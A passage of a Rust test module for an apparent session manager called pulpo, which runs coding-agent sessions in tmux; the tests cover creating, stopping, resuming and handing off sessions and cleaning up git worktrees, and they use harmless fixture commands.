        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "claude",
            &id,
            "test-session",
            Some("ghostty"),
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );
        assert!(cmd.contains("export TERM_PROGRAM='ghostty'"));
    }

    #[test]
    fn test_wrap_command_no_term_program() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "claude",
            &id,
            "test-session",
            None,
            "/tmp",
            DEFAULT_DAEMON_PORT,
        );
        assert!(!cmd.contains("TERM_PROGRAM"));
    }

    #[tokio::test]
    async fn test_create_session_emits_event() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let _session = mgr.create_session(make_req("event-test")).await.unwrap();

        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.session_name, "event-test");
        assert_eq!(se.status, "working");
        assert_eq!(se.previous_status.as_deref(), Some("starting"));
        assert_eq!(se.node_name, "test-node");
    }

    #[tokio::test]
    async fn test_stop_session_emits_event() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let session = mgr.create_session(make_req("stop-event")).await.unwrap();
        // Drain the create event
        let _ = event_rx.recv().await;

        mgr.stop_session(&session.id.to_string(), false)
            .await
            .unwrap();
        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.status, "done");
        assert_eq!(se.status_reason.as_deref(), Some("stopped"));
    }

    #[tokio::test]
    async fn test_stop_session_purge_emits_deleted_event() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let session = mgr.create_session(make_req("purge-event")).await.unwrap();
        let _ = event_rx.recv().await;

        mgr.stop_session(&session.id.to_string(), true)
            .await
            .unwrap();

        let stopped = event_rx.recv().await.unwrap();
        let deleted = event_rx.recv().await.unwrap();
        let stopped = unwrap_session_event(stopped);
        assert_eq!(stopped.status, "done");
        assert_eq!(stopped.status_reason.as_deref(), Some("stopped"));
        match deleted {
            PulpoEvent::SessionDeleted(se) => {
                assert_eq!(se.session_id, session.id.to_string());
                assert_eq!(se.session_name, "purge-event");
                assert_eq!(se.node_name, "test-node");
            }
            PulpoEvent::Session(_)
            | PulpoEvent::UsageAlert(_)
            | PulpoEvent::Intervention(_)
            | PulpoEvent::Daemon(_) => {
                panic!("expected session_deleted event")
            }
        }
    }

    #[tokio::test]
    async fn test_stop_session_purge_active_succeeds() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();

        // stop_session with purge handles active sessions fine — stops then purges
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_session_purge_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.stop_session("nonexistent", true).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not found"));
    }

    #[tokio::test]
    async fn test_resolve_backend_id_with_stored() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let backend_id = mgr.resolve_backend_id(&session);
        // MockBackend.query_backend_id returns $N where N is name length
        assert_eq!(backend_id, "$4");
    }

    #[tokio::test]
    async fn test_resolve_command_no_command_falls_back_to_shell() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            description: Some("desc".into()),
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let resolved = mgr.resolve_command(&req);
        // Falls back to $SHELL or /bin/sh
        assert!(!resolved.command.is_empty());
        assert_eq!(resolved.description, Some("desc".into()));
    }

    #[tokio::test]
    async fn test_create_session_uses_default_command() {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, Some("claude".into())).with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "default-cmd-test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.command, "claude");
    }

    #[tokio::test]
    async fn test_create_session_explicit_command_overrides_default() {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, Some("claude".into())).with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "explicit-cmd-test".into(),
            workdir: Some("/tmp".into()),
            command: Some("custom-agent".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.command, "custom-agent");
    }

    #[tokio::test]
    async fn test_create_session_no_command_no_default_falls_back_to_shell() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "no-fallback".into(),
            workdir: Some("/tmp".into()),
            command: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        // Should fall back to $SHELL or /bin/sh
        assert!(!session.command.is_empty());
        let calls = backend.calls.lock().unwrap();
        assert!(calls[0].contains("-l -c"));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_resumes_active_with_dead_backend() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        // Create a session (backend is alive)
        mgr.create_session(make_req("sess-a")).await.unwrap();

        // Now simulate reboot: backend reports dead
        *backend.alive.lock().unwrap() = false;

        // Build a new manager that uses the same store but with dead backend
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 1);

        // Backend should have received a create call for the resumed session
        // 2 create calls: one from original create_session, one from resume
        let resume_creates = backend
            .calls
            .lock()
            .unwrap()
            .iter()
            .filter(|c| c.starts_with("create:"))
            .count();
        assert_eq!(resume_creates, 2);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_skips_stopped_sessions() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("stopped-sess")).await.unwrap();
        mgr.stop_session("stopped-sess", false).await.unwrap();

        *backend.alive.lock().unwrap() = false;
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_skips_alive_sessions() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("alive-sess")).await.unwrap();

        // Backend is alive — should not resume
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_resumes_idle_sessions() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("idle-sess")).await.unwrap();

        // Manually set to Idle (simulates watchdog marking it idle before reboot)
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Waiting, None)
            .await
            .unwrap();

        *backend.alive.lock().unwrap() = false;
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 1);

        // Simulate the resumed session being alive now
        *backend.alive.lock().unwrap() = true;

        // Session should be Active again
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Working);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_marks_lost_on_backend_failure() {
        let (mgr, _, _pool) =
            test_manager(MockBackend::new().with_alive(false).with_create_error()).await;
        // Force-insert a session that looks active but backend will fail on resume
        let session = Session {
            id: Uuid::new_v4(),
            name: "fail-resume".into(),
            workdir: "/tmp".into(),
            command: "echo hello".into(),
            status: SessionStatus::Working,
            backend_session_id: Some("fail-resume".into()),
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);

        // Session should be marked Lost (not Active)
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_marks_lost_on_invalid_workdir() {
        // Mirrors `test_resume_session_invalid_workdir` for the auto-resume-on-startup
        // path: a workdir that no longer exists on disk must not be silently
        // auto-resumed into a broken tmux session — mark it Lost and move on.
        let (mgr, _backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = Session {
            id: Uuid::new_v4(),
            name: "vanished-workdir".into(),
            workdir: "/nonexistent/path/that/does/not/exist".into(),
            command: "echo hello".into(),
            status: SessionStatus::Working,
            backend_session_id: Some("vanished-workdir".into()),
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_clears_stale_harness_state() {
        // Regression: a session resumed after being left with a stale
        // `harness_last_event_at`/`needs_input`/`last_summary` from its previous
        // process run must have all three cleared before the backend is recreated —
        // otherwise heuristics stay bypassed and stale badges linger until the new
        // process's own hooks fire again.
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;
        mgr.store()
            .batch_update_session_metadata(
                &session.id.to_string(),
                &[
                    (meta::NEEDS_INPUT, "permission"),
                    (meta::LAST_SUMMARY, "old summary"),
                ],
                &[],
            )
            .await
            .unwrap();
        mgr.store()
            .touch_harness_last_event_at(&session.id.to_string())
            .await
            .unwrap();

        *backend.alive.lock().unwrap() = false;
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 1);

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert!(fetched.harness_last_event_at.is_none());
        assert_eq!(fetched.meta_str(meta::NEEDS_INPUT), None);
        assert_eq!(fetched.meta_str(meta::LAST_SUMMARY), None);
    }

    #[tokio::test]
    async fn test_resume_session_clears_stale_harness_state() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = harness_session(&mgr).await;
        mgr.store()
            .update_session_metadata_field(&session.id.to_string(), meta::NEEDS_INPUT, "question")
            .await
            .unwrap();
        mgr.store()
            .touch_harness_last_event_at(&session.id.to_string())
            .await
            .unwrap();

        // get_session marks it Lost since the backend is dead.
        let _ = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();

        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert!(fetched.harness_last_event_at.is_none());
        assert_eq!(fetched.meta_str(meta::NEEDS_INPUT), None);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_returns_zero_when_empty() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_uses_name_derived_id_not_stale_backend_id() {
        // Regression test: after a reboot, `backend_session_id` may point at a
        // tmux $N id from a session that no longer exists. Auto-resume must create
        // the new tmux session named after the pulpo session (via
        // `backend.session_id(&session.name)`), not by reusing that stale $N value
        // as the new session's name — otherwise recreated sessions end up literally
        // named "$4", "$5", etc.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = Session {
            id: Uuid::new_v4(),
            name: "reboot-sess".into(),
            workdir: "/tmp".into(),
            command: "echo hello".into(),
            status: SessionStatus::Working,
            backend_session_id: Some("$4".into()),
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 1);

        let calls: Vec<String> = backend.calls.lock().unwrap().clone();
        assert!(
            calls.iter().any(|c| c.starts_with("create:reboot-sess:")),
            "expected create call keyed by session name, not stale backend id; calls: {calls:?}"
        );
        assert!(
            !calls.iter().any(|c| c.starts_with("create:$4:")),
            "must not reuse the stale backend id as the new tmux session name; calls: {calls:?}"
        );

        // The stale $N id must not linger in the DB either — refresh_backend_session_id
        // (called by restore_session_backend for both resume paths) re-queries the
        // backend by name and persists the fresh id.
        let fetched = mgr
            .store()
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        // MockBackend.query_backend_id() returns $N where N is the name length —
        // "reboot-sess" is 11 characters.
        assert_eq!(fetched.backend_session_id, Some("$11".into()));
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_uses_worktree_path_when_it_exists() {
        // Regression test: resume_lost_sessions must resume into the worktree
        // (when it still exists on disk), the same as the manual resume_session
        // path — not blindly into the original session.workdir.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let worktree_dir = tempfile::tempdir().unwrap();
        let worktree_path = worktree_dir.path().to_str().unwrap().to_owned();

        let session = Session {
            id: Uuid::new_v4(),
            name: "worktree-sess".into(),
            workdir: "/nonexistent/original/workdir".into(),
            worktree_path: Some(worktree_path.clone()),
            command: "echo hello".into(),
            status: SessionStatus::Working,
            backend_session_id: Some("worktree-sess".into()),
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 1);

        let calls: Vec<String> = backend.calls.lock().unwrap().clone();
        assert!(
            calls
                .iter()
                .any(|c| c.starts_with(&format!("create:worktree-sess:{worktree_path}:"))),
            "expected the still-existing worktree path to be used as the resumed session's workdir; calls: {calls:?}"
        );
    }

    #[tokio::test]
    async fn test_create_session_invalid_workdir() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "bad-dir".to_owned(),
            workdir: Some("/nonexistent/path/that/does/not/exist".into()),
            command: Some("echo hi".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let err = mgr.create_session(req).await.unwrap_err();
        assert!(
            err.to_string().contains("working directory does not exist"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn test_create_session_docker_runtime_rejected() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let mut req = make_req("docker-rejected");
        req.runtime = Some(Runtime::Docker);
        let err = mgr.create_session(req).await.unwrap_err();
        assert!(
            err.to_string().contains("docker runtime was removed"),
            "{err}"
        );
        // The backend must never be asked to create anything
        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_session_invalid_workdir() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("resume-bad-dir"))
            .await
            .unwrap();
        let id = session.id.to_string();
        // Mark as lost and set workdir to nonexistent path
        sqlx::query("UPDATE sessions SET status = 'lost', workdir = ? WHERE id = ?")
            .bind("/nonexistent/path/that/does/not/exist")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        let err = mgr.resume_session(&id).await.unwrap_err();
        assert!(
            err.to_string().contains("working directory does not exist"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn test_resume_session_docker_runtime_rejected() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        // Force-insert a historical docker-runtime session (cannot be created anymore)
        let session = Session {
            id: Uuid::new_v4(),
            name: "old-docker".into(),
            workdir: "/tmp".into(),
            command: "claude".into(),
            status: SessionStatus::Lost,
            backend_session_id: Some("docker:pulpo-old-docker".into()),
            runtime: Runtime::Docker,
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let err = mgr
            .resume_session(&session.id.to_string())
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("docker runtime was removed"),
            "{err}"
        );
        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    #[tokio::test]
    async fn test_list_sessions_includes_historical_docker_sessions() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        // Historical rows stored with runtime = "docker" must still list
        let session = Session {
            id: Uuid::new_v4(),
            name: "old-docker-row".into(),
            workdir: "/tmp".into(),
            command: "claude".into(),
            status: SessionStatus::Done,
            backend_session_id: Some("docker:pulpo-old-docker-row".into()),
            runtime: Runtime::Docker,
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let sessions = mgr.list_sessions().await.unwrap();
        let listed = sessions
            .iter()
            .find(|s| s.name == "old-docker-row")
            .unwrap();
        assert_eq!(listed.runtime, Runtime::Docker);
        assert_eq!(listed.status, SessionStatus::Done);
    }

    #[test]
    fn test_validate_runtime_tmux_ok_docker_rejected() {
        assert!(validate_runtime(Runtime::Tmux).is_ok());
        let err = validate_runtime(Runtime::Docker).unwrap_err();
        assert!(
            err.to_string()
                .contains("the docker runtime was removed; sessions run in tmux"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn test_stale_grace_period_prevents_early_marking() {
        // Use default stale_grace_secs (5) — don't use with_no_stale_grace
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new().with_alive(false));
        let mgr = SessionManager::new(backend, store, None);

        let session = mgr.create_session(make_req("young")).await.unwrap();
        // Session was just created — within grace period, so check_and_mark_stale returns false
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        // Status should remain Active despite backend being dead (grace period)
        assert_eq!(fetched.status, SessionStatus::Working);
    }

    #[test]
    fn test_cleanup_worktree_nonexistent_path() {
        // Should not panic on nonexistent path
        cleanup_worktree("/tmp/nonexistent-worktree-path-for-test", "/tmp");
    }

    #[test]
    fn test_cleanup_worktree_existing_path() {
        // Create a temporary directory structure simulating ~/.pulpo/worktrees/session
        let tmpdir = tempfile::tempdir().unwrap();
        let wt_path = tmpdir
            .path()
            .join(".pulpo")
            .join("worktrees")
            .join("test-session");
        std::fs::create_dir_all(&wt_path).unwrap();
        let wt_str = wt_path.to_str().unwrap();
        assert!(wt_path.exists());
        // repo_dir doesn't need to be a real git repo for this test — prune is best-effort
        cleanup_worktree(wt_str, "/tmp");
        // The worktree directory should be removed
        assert!(!wt_path.exists());
    }

    #[tokio::test]
    async fn test_stop_session_with_worktree() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("wt-stop")).await.unwrap();
        let id = session.id.to_string();
        // Simulate a session with a worktree path (nonexistent — cleanup is best-effort)
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind("/tmp/nonexistent-wt-stop-test")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        // Stop should succeed even with a worktree path
        mgr.stop_session(&id, false).await.unwrap();
    }

    #[tokio::test]
    async fn test_stop_session_purge_with_worktree() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("wt-purge")).await.unwrap();
        let id = session.id.to_string();
        // Simulate a session with a worktree path (nonexistent — cleanup is best-effort)
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind("/tmp/nonexistent-wt-purge-test")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        // Stop with purge should stop, clean up worktree, and delete from DB
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    /// `worktree_base` alone (no explicit `worktree: true`) must still isolate the
    /// session in a git worktree — matching the CLI's own normalization
    /// (`pulpo-cli/src/lib.rs`: "--base-branch implies --worktree"). Uses a real git
    /// repo, like `session::utils::git_integration_tests` — gated `not(coverage)`
    /// for the same reason: the coverage build has no real repos, and
    /// `build_create_plan`'s worktree-creation call itself is `cfg(not(coverage))`.
    #[cfg(not(coverage))]
    #[tokio::test]
    async fn test_create_session_worktree_base_without_worktree_flag_still_isolates() {
        let repo = tempfile::tempdir().unwrap();
        let repo_path = repo.path().to_str().unwrap().to_owned();
        let git = |args: &[&str]| {
            std::process::Command::new("git")
                .args(args)
                .current_dir(&repo_path)
                .output()
                .expect("git should run")
        };
        git(&["init", "-q"]);
        git(&["config", "user.email", "qa@pulpo.test"]);
        git(&["config", "user.name", "pulpo-qa"]);
        std::fs::write(repo.path().join("README.md"), "seed").unwrap();
        git(&["add", "."]);
        git(&["commit", "-q", "-m", "init"]);

        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let mut req = make_req("worktree-base-only");
        req.workdir = Some(repo_path);
        req.worktree = None;
        req.worktree_base = Some("HEAD".into());

        let session = mgr.create_session(req).await.unwrap();

        assert!(
            session.worktree_path.is_some(),
            "worktree_base alone should trigger worktree isolation"
        );
        assert_eq!(
            session.worktree_branch.as_deref(),
            Some("worktree-base-only")
        );
    }

    // -- Handoff tests --

    fn make_handoff_req() -> HandoffSessionRequest {
        HandoffSessionRequest {
            name: None,
            command: None,
            description: None,
            budget_cost_usd: None,
            idle_threshold_secs: None,
            term_program: None,
        }
    }

    #[tokio::test]
    async fn test_handoff_session_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let err = mgr
            .handoff_session("nonexistent", make_handoff_req())
            .await
            .unwrap_err();
        assert!(err.to_string().contains("session not found"), "got: {err}");
    }

    #[tokio::test]
    async fn test_handoff_session_auto_name_no_worktree() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), make_handoff_req())
            .await
            .unwrap();

        assert_eq!(handed_off.name, "plan-auth-2");
        assert_eq!(handed_off.workdir, source.workdir);
        assert!(handed_off.worktree_path.is_none());
    }

    #[tokio::test]
    async fn test_handoff_session_auto_name_skips_existing() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        mgr.create_session(make_req("plan-auth-2")).await.unwrap();

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), make_handoff_req())
            .await
            .unwrap();

        assert_eq!(handed_off.name, "plan-auth-3");
    }

    #[tokio::test]
    async fn test_handoff_session_explicit_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        let req = HandoffSessionRequest {
            name: Some("implement-auth".into()),
            ..make_handoff_req()
        };

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), req)
            .await
            .unwrap();

        assert_eq!(handed_off.name, "implement-auth");
    }

    #[tokio::test]
    async fn test_handoff_session_by_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("plan-auth")).await.unwrap();

        // Resolves the source by name, same as get_session.
        let handed_off = mgr
            .handoff_session("plan-auth", make_handoff_req())
            .await
            .unwrap();

        assert_eq!(handed_off.name, "plan-auth-2");
    }

    #[tokio::test]
    async fn test_handoff_session_invalid_explicit_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        let req = HandoffSessionRequest {
            name: Some("Bad Name".into()),
            ..make_handoff_req()
        };

        let err = mgr
            .handoff_session(&source.id.to_string(), req)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("lowercase"), "got: {err}");
    }

    #[tokio::test]
    async fn test_handoff_session_passes_through_fields() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        let req = HandoffSessionRequest {
            command: Some("codex 'implement PLAN.md'".into()),
            description: Some("Implement the plan".into()),
            idle_threshold_secs: Some(120),
            budget_cost_usd: Some(3.5),
            ..make_handoff_req()
        };

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), req)
            .await
            .unwrap();

        assert_eq!(handed_off.command, "codex 'implement PLAN.md'");
        assert_eq!(
            handed_off.description.as_deref(),
            Some("Implement the plan")
        );
        assert_eq!(handed_off.idle_threshold_secs, Some(120));
        assert_eq!(handed_off.meta_str(meta::BUDGET_COST_USD), Some("3.5"));
    }

    #[tokio::test]
    async fn test_handoff_session_adopts_worktree() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        let wt_tmp = tempfile::tempdir().unwrap();
        let wt_path = wt_tmp.path().to_str().unwrap().to_owned();
        sqlx::query("UPDATE sessions SET worktree_path = ?, worktree_branch = ? WHERE id = ?")
            .bind(&wt_path)
            .bind("plan-auth")
            .bind(source.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), make_handoff_req())
            .await
            .unwrap();

        assert_eq!(handed_off.worktree_path.as_deref(), Some(wt_path.as_str()));
        assert_eq!(handed_off.worktree_branch.as_deref(), Some("plan-auth"));
        // `pulpo worktree list` filters on worktree_path being set — it's naturally
        // included with no server-side change needed.
        assert!(handed_off.worktree_path.is_some());

        // The new session's tmux command must run in the worktree, not source.workdir.
        let calls = backend.calls.lock().unwrap();
        assert!(
            calls.iter().any(|c| c.contains(&wt_path)),
            "expected create call in worktree dir, got: {calls:?}"
        );
        drop(calls);
    }

    #[tokio::test]
    async fn test_handoff_session_worktree_missing_on_disk_bails() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        sqlx::query("UPDATE sessions SET worktree_path = ?, worktree_branch = ? WHERE id = ?")
            .bind("/tmp/pulpo-test-definitely-does-not-exist-xyz")
            .bind("plan-auth")
            .bind(source.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        let err = mgr
            .handoff_session(&source.id.to_string(), make_handoff_req())
            .await
            .unwrap_err();
        assert!(err.to_string().contains("no longer exists"), "got: {err}");
    }

    #[test]
    fn test_handoff_suffixed_name_no_truncation_needed() {
        assert_eq!(
            SessionManager::handoff_suffixed_name("plan-auth", 2),
            "plan-auth-2"
        );
    }

    #[test]
    fn test_handoff_suffixed_name_truncates_long_source() {
        let long = "a".repeat(130);
        let name = SessionManager::handoff_suffixed_name(&long, 2);
        assert_eq!(name.len(), 128);
        assert!(name.ends_with("-2"));
    }

    #[test]
    fn test_handoff_suffixed_name_trims_trailing_hyphen_after_truncation() {
        // 125 'a's + a hyphen at position 126 + filler — truncating to 126 chars
        // (128 - len("-2")) would otherwise leave a dangling hyphen before the suffix.
        let mut long = "a".repeat(125);
        long.push('-');
        long.push_str("bbbb");
        let name = SessionManager::handoff_suffixed_name(&long, 2);
        assert!(!name.contains("--"), "got: {name}");
        assert!(name.ends_with("-2"));
    }

    #[tokio::test]
    async fn test_next_handoff_name_exhausts_to_suffix_100() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        for i in 2..=99u32 {
            let s = Session {
                id: Uuid::new_v4(),
                name: format!("plan-auth-{i}"),
                workdir: "/tmp".into(),
                command: "echo".into(),
                ..Default::default()
            };
            mgr.store().insert_session(&s).await.unwrap();
        }

        let name = mgr.next_handoff_name("plan-auth").await.unwrap();
        assert_eq!(name, "plan-auth-100");
    }

    // -- Worktree cleanup guard (shared worktrees via handoff) --

    #[tokio::test]
    async fn test_purge_session_skips_cleanup_when_worktree_shared() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let wt_tmp = tempfile::tempdir().unwrap();
        let wt_path = wt_tmp.path().to_str().unwrap().to_owned();

        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind(&wt_path)
            .bind(source.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

        // A second, still-active session shares the same worktree (as a real
        // `pulpo handoff` session would).
        let handoff = mgr.create_session(make_req("plan-auth-2")).await.unwrap();
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind(&wt_path)
            .bind(handoff.id.to_string())
            .execute(mgr.store().pool())
            .await
            .unwrap();

